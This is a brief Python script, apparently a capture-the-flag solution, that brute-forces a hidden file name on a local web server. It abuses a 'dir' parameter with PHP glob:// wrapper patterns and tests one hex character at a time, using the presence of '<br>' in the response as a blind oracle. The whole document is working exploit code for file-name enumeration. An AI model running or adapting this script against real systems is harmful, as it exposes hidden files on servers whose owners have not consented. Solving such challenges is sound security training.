import requests

URL = "http://0.0.0.0:8000"
chars = ''

alphabet = "abcdefABCDEF0123456789"

for i in range(15):
    for char in alphabet:
        PARAMS  = { 'dir': f'glob://./flag{chars}{char}*' }
        r =requests.get(url = URL, params = PARAMS)
        if r.text.__contains__('<br>'):
            chars += char
            break

    print("flag" + chars)
    
    PARAMS = { 'dir': f'glob://./flag{chars}.txt' }
    r = requests.get(url = URL, params = PARAMS)
    if r.text.__contains__('<br>'):
        print('end')
        break

final = f"flag{chars}.txt"
PARAMS = {'dir': 'glob://./' + final}
r = requests.get(url = URL, params = PARAMS)
print(r.text.__contains__('<br>'))
print(final)
